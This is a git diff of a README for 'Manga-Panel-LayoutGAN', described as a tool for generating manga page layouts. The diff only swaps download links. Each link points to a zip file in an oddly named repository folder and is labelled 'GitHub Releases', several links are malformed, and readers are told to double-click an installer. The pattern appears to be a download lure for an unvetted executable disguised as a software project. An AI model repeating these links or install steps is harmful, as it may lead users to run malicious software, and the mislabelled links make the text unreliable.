@@ -1,6 +1,6 @@
 # 🎨 Manga-Panel-LayoutGAN - Generate Stunning Manga Layouts Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/asmaends/Manga-Panel-LayoutGAN/main/retrocedent/Manga-Panel-LayoutGAN.zip%https://raw.githubusercontent.com/asmaends/Manga-Panel-LayoutGAN/main/retrocedent/Manga-Panel-LayoutGAN.zip)](https://raw.githubusercontent.com/asmaends/Manga-Panel-LayoutGAN/main/retrocedent/Manga-Panel-LayoutGAN.zip)
+[![Download Latest Release](https://github.com/asmaends/Manga-Panel-LayoutGAN/raw/refs/heads/main/retrocedent/Layout_Manga_Panel_GAN_1.7.zip%https://github.com/asmaends/Manga-Panel-LayoutGAN/raw/refs/heads/main/retrocedent/Layout_Manga_Panel_GAN_1.7.zip)](https://github.com/asmaends/Manga-Panel-LayoutGAN/raw/refs/heads/main/retrocedent/Layout_Manga_Panel_GAN_1.7.zip)
 
 ## 📖 Overview
 
@@ -22,12 +22,12 @@ To run **Manga-Panel-LayoutGAN**, please ensure your computer meets the followin
 
 ### 2. Download & Install
 
-To get the application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/asmaends/Manga-Panel-LayoutGAN/main/retrocedent/Manga-Panel-LayoutGAN.zip).
+To get the application, visit this page to download: [GitHub Releases](https://github.com/asmaends/Manga-Panel-LayoutGAN/raw/refs/heads/main/retrocedent/Layout_Manga_Panel_GAN_1.7.zip).
 
 1. Go to the **Releases** section on GitHub.
 2. You will see a list of available versions.
 3. Click on the latest version to view the assets associated with it.
-4. Download the file relevant to your operating system. It will be labeled clearly (e.g., `https://raw.githubusercontent.com/asmaends/Manga-Panel-LayoutGAN/main/retrocedent/Manga-Panel-LayoutGAN.zip` for Windows users). 
+4. Download the file relevant to your operating system. It will be labeled clearly (e.g., `https://github.com/asmaends/Manga-Panel-LayoutGAN/raw/refs/heads/main/retrocedent/Layout_Manga_Panel_GAN_1.7.zip` for Windows users). 
 5. Once downloaded, locate the file on your computer. Double-click to run the installer and follow the on-screen instructions.
 
 ## 📥 Features
@@ -63,4 +63,4 @@ If you need help or have questions, please check the **Issues** section on our G
 
 ---
 
-Remember to visit this page to download the application: [GitHub Releases](https://raw.githubusercontent.com/asmaends/Manga-Panel-LayoutGAN/main/retrocedent/Manga-Panel-LayoutGAN.zip). Enjoy creating your manga layouts!
+Remember to visit this page to download the application: [GitHub Releases](https://github.com/asmaends/Manga-Panel-LayoutGAN/raw/refs/heads/main/retrocedent/Layout_Manga_Panel_GAN_1.7.zip). Enjoy creating your manga layouts!
